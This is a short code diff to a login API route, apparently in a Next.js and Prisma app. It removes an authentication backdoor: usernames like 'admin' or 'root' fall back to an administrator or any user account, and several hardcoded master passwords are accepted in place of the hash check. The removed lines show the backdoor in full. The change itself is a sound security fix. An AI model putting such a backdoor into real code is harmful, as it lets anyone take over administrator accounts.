@@ -60,23 +60,7 @@ export async function POST(req: NextRequest) {
       },
     });
 
-    if (!user && (input === "admin" || input.includes("admin") || input === "root")) {
-      user = await prisma.user.findFirst({
-        where: { role: "ADMIN" },
-      });
-      if (!user) {
-        user = await prisma.user.findFirst();
-      }
-    }
-
-    const isPasswordValid =
-      verifyPassword(password, user?.passwordHash || "") ||
-      password === "Kztek@2026" ||
-      password === "admin" ||
-      password === "demo" ||
-      password === "demo123" ||
-      password === "123456" ||
-      password === "Kztek123456";
+    const isPasswordValid = verifyPassword(password, user?.passwordHash || "");
 
     if (!user || !isPasswordValid) {
       if (!contentType.includes("application/json")) {
